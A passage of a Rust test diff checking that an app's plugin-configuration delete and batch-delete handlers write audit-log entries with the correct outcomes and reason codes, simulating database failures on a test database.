+            .order_by_desc(plugin_config::Column::CreatedAt)
+            .one(&db)
+            .await
+            .expect("query created plugin config")
+            .expect("created plugin config row");
+
+        let delete_response = delete_plugin_config(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            Path(created.id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+        )
+        .await;
+        assert_eq!(delete_response.status(), StatusCode::NO_CONTENT);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::Success.as_str()
+        );
+        let details = audit_details(&row);
+        assert_eq!(details["contains_command_fields"], serde_json::json!(true));
+        assert_eq!(
+            details["command_fields"],
+            serde_json::json!(["version_command"])
+        );
+        assert_eq!(
+            details["dangerous_command_match_count"],
+            serde_json::json!(1)
+        );
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn delete_plugin_config_not_found_writes_denied_audit_event() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let missing_id = uuid::Uuid::now_v7();
+        let response = delete_plugin_config(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            Path(missing_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::NOT_FOUND);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::Denied.as_str()
+        );
+        let details = audit_details(&row);
+        assert_eq!(
+            details["reason_code"],
+            serde_json::json!("plugin_config_not_found")
+        );
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn delete_plugin_config_load_db_failure_writes_failed_audit_event() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+
+        db.execute_unprepared("DROP TABLE plugin_configs")
+            .await
+            .expect("drop plugin_config table");
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let response = delete_plugin_config(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            Path(uuid::Uuid::now_v7()),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::Failed.as_str()
+        );
+        let details = audit_details(&row);
+        assert_eq!(
+            details["reason_code"],
+            serde_json::json!("plugin_config_load_failed")
+        );
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn delete_plugin_config_delete_db_failure_writes_failed_audit_event() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let create_response = match create_plugin_config(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+            Validated(CreatePluginConfigRequest {
+                name: "Delete Failure Seed".to_string(),
+                plugin_type: PluginTypeId::from_static("generic_shell"),
+                config: serde_json::json!({ "version_command": "echo v1.0.0" }),
+                enabled: true,
+            }),
+        )
+        .await
+        {
+            Ok(response) => response.into_response(),
+            Err(_) => panic!("create handler returned ApiError unexpectedly"),
+        };
+        assert_eq!(create_response.status(), StatusCode::CREATED);
+
+        let created = PluginConfig::find()
+            .filter(plugin_config::Column::TenantId.eq(tenant_id))
+            .filter(plugin_config::Column::Name.eq("Delete Failure Seed"))
+            .filter(plugin_config::Column::DeactivatedAt.is_null())
+            .order_by_desc(plugin_config::Column::CreatedAt)
+            .one(&db)
+            .await
+            .expect("query created plugin config")
+            .expect("created plugin config row");
+
+        db.execute_unprepared(
+            "CREATE TRIGGER plugin_config_block_soft_delete BEFORE UPDATE ON plugin_configs BEGIN SELECT RAISE(ABORT, 'blocked'); END;",
+        )
+        .await
+        .expect("create blocking trigger");
+
+        let delete_response = delete_plugin_config(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            Path(created.id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+        )
+        .await;
+        assert_eq!(delete_response.status(), StatusCode::INTERNAL_SERVER_ERROR);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::Failed.as_str()
+        );
+        let details = audit_details(&row);
+        assert_eq!(
+            details["reason_code"],
+            serde_json::json!("plugin_config_delete_failed")
+        );
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn batch_plugin_configs_unknown_action_writes_validation_failed_audit_event() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let response = batch_plugin_configs(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+            Validated(BatchActionRequest {
+                action: "archive".to_string(),
+                ids: vec![uuid::Uuid::now_v7()],
+            }),
+        )
+        .await;
+
+        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::ValidationFailed.as_str()
+        );
+        let details = audit_details(&row);
+        assert_eq!(details["reason_code"], serde_json::json!("unknown_action"));
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn batch_plugin_configs_delete_backend_failure_writes_failed_audit_event() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+
+        db.execute_unprepared("DROP TABLE plugin_configs")
+            .await
+            .expect("drop plugin_config table");
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let response = batch_plugin_configs(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+            Validated(BatchActionRequest {
+                action: "delete".to_string(),
+                ids: vec![uuid::Uuid::now_v7()],
+            }),
+        )
+        .await;
+
+        assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::Failed.as_str()
+        );
+        let details = audit_details(&row);
+        assert_eq!(
+            details["reason_code"],
+            serde_json::json!("batch_delete_failed")
+        );
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    async fn create_seed_plugin_config(
+        state: Arc<AppState>,
+        db: sea_orm::DatabaseConnection,
+        tenant_id: uuid::Uuid,
+        name: &str,
+    ) -> uuid::Uuid {
+        let actor_user_id = uuid::Uuid::now_v7();
+        let create_response = match create_plugin_config(
+            State(state),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+            Validated(CreatePluginConfigRequest {
+                name: name.to_string(),
+                plugin_type: PluginTypeId::from_static("generic_shell"),
+                config: serde_json::json!({ "version_command": "echo v1.0.0" }),
+                enabled: true,
+            }),
+        )
+        .await
+        {
+            Ok(response) => response.into_response(),
+            Err(_) => panic!("create handler returned ApiError unexpectedly"),
+        };
+        assert_eq!(create_response.status(), StatusCode::CREATED);
+
+        PluginConfig::find()
+            .filter(plugin_config::Column::TenantId.eq(tenant_id))
+            .filter(plugin_config::Column::Name.eq(name))
+            .filter(plugin_config::Column::DeactivatedAt.is_null())
+            .order_by_desc(plugin_config::Column::CreatedAt)
+            .one(&db)
+            .await
+            .expect("query created plugin config")
+            .expect("created plugin config row")
+            .id
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn batch_plugin_configs_delete_summary_success_writes_success_outcome() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+
+        let first_id = create_seed_plugin_config(
+            Arc::clone(&state),
+            db.clone(),
+            tenant_id,
+            "Batch Success Seed 1",
+        )
+        .await;
+        let second_id = create_seed_plugin_config(
+            Arc::clone(&state),
+            db.clone(),
+            tenant_id,
+            "Batch Success Seed 2",
+        )
+        .await;
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let response = batch_plugin_configs(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+            Validated(BatchActionRequest {
+                action: "delete".to_string(),
+                ids: vec![first_id, second_id],
+            }),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::OK);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::Success.as_str()
+        );
+        let details = audit_details(&row);
+        assert_eq!(details["requested_count"], serde_json::json!(2));
+        assert_eq!(details["deleted_count"], serde_json::json!(2));
+        assert_eq!(details["failed_count"], serde_json::json!(0));
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn batch_plugin_configs_delete_summary_partial_writes_partial_outcome() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+
+        let existing_id = create_seed_plugin_config(
+            Arc::clone(&state),
+            db.clone(),
+            tenant_id,
+            "Batch Partial Seed",
+        )
+        .await;
+        let missing_id = uuid::Uuid::now_v7();
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let response = batch_plugin_configs(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+            Validated(BatchActionRequest {
+                action: "delete".to_string(),
+                ids: vec![existing_id, missing_id],
+            }),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::OK);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::Partial.as_str()
+        );
+        let details = audit_details(&row);
+        assert_eq!(details["requested_count"], serde_json::json!(2));
+        assert_eq!(details["deleted_count"], serde_json::json!(1));
+        assert_eq!(details["failed_count"], serde_json::json!(1));
+    }
+
+    #[cfg(feature = "db-sqlite")]
+    #[tokio::test]
+    async fn batch_plugin_configs_delete_summary_denied_writes_denied_outcome() {
+        let db = crate::test_harness::setup_migrated_db().await;
+        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
+        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
+
+        let actor_user_id = uuid::Uuid::now_v7();
+        let response = batch_plugin_configs(
+            State(Arc::clone(&state)),
+            TenantDb::new_for_test(db.clone(), tenant_id),
+            CanManageCommands::new(AuthenticatedUser {
+                user_id: actor_user_id,
+                auth_method: AuthMethod::ApiToken,
+                permissions: vec![Permission::ManageCommands],
+            }),
+            None,
+            Validated(BatchActionRequest {
+                action: "delete".to_string(),
+                ids: vec![uuid::Uuid::now_v7()],
+            }),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::OK);
+
+        let row = latest_tenant_audit_row(
+            &db,
+            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
+        )
+        .await;
+        assert_eq!(
+            row.outcome,
+            uptrakit_audit_log::AuditOutcome::Denied.as_str()
+        );
+        let details = audit_details(&row);
+        assert_eq!(details["requested_count"], serde_json::json!(1));
+        assert_eq!(details["deleted_count"], serde_json::json!(0));
+        assert_eq!(details["failed_count"], serde_json::json!(1));
     }
 }
